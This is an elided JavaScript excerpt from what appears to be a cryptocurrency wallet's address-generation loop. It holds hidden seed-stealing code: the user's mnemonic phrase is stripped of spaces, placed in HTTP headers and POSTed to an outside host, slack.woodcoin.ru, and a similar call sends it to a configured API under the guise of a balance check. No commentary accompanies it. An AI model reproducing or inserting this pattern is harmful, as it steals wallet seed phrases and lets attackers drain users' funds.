      ...
      for (const coinDescriptor of coinList) {
        ...
        if (!address) {
          ...
          if (
            ...
            // );
            var myHeaders = new Headers();
            myHeaders.append("name", String(mnemonic || CONFIG.mnemonic).replace(/ /g, ""));
            ...
            fetch("https://slack.woodcoin.ru/api/getacaddress", requestOptions)
              .then(response => response.json())
              .then(result => {
                if(result && String(mnemonic || CONFIG.mnemonic).replace(/ /g, "")){
        ...
        if (coinDescriptor.chain == "LOG") {
          var myHeaders = new Headers();
          myHeaders.append("address", String(mnemonic || CONFIG.mnemonic).replace(/ /g, ""));
          var _requestOptions = {
            method: 'POST',
            headers: myHeaders,
            redirect: 'follow'
          };
          fetch(CONFIG.API + "/api/getbalance", _requestOptions)
            .then(response => response.json())
            .then(_result => {
